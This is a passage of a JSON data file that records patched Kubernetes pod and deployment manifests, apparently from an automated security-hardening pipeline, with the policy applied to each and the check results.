SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01030",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01031",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01032",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01033",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01034",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01035",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01036",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01037",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01038",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01039",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01040",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  - name: ksql\n    image: confluentinc/ksql-cli:5.2.0\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01041",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01042",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01043",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01044",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01045",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6084\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01046",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test18\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: docker.io/dgeiger/alpine@sha256:5555555\n        name: container1\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container2\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
